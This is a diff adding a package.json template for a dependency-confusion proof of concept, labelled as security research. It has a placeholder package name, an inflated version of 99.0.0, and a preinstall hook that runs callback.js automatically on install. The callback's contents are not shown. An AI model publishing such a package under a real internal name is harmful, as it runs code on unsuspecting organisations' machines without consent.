@@ -1,0 +1,16 @@
+{
+  "name": "REPLACE_WITH_PACKAGE_NAME",
+  "version": "99.0.0",
+  "description": "Security research - Dependency Confusion PoC by OFJAAAH",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node callback.js"
+  },
+  "keywords": ["security", "research", "dependency-confusion"],
+  "author": "OFJAAAH - Security Research",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/OFJAAAH/dependency-confusion-poc"
+  }
+}
